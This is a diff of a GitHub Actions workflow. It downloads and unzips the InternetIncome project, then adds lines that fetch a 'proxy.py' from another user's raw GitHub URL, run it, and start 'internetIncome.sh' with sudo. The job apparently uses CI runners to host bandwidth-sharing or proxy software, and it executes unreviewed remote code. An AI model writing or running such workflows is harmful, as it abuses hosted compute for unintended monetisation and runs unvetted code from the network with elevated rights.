@@ -32,9 +32,11 @@ jobs:
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
         run: |
-          sudo apt-get update
-          sudo apt-get -y install docker.io
           wget -O main.zip https://github.com/engageub/InternetIncome/archive/refs/heads/main.zip
           sudo apt-get install unzip
           unzip -o main.zip
           cd InternetIncome-main
+          wget https://raw.githubusercontent.com/kanekikun07/Yo/refs/heads/main/proxy.py
+          pip install requests
+          python proxy.py
+          sudo bash internetIncome.sh --start
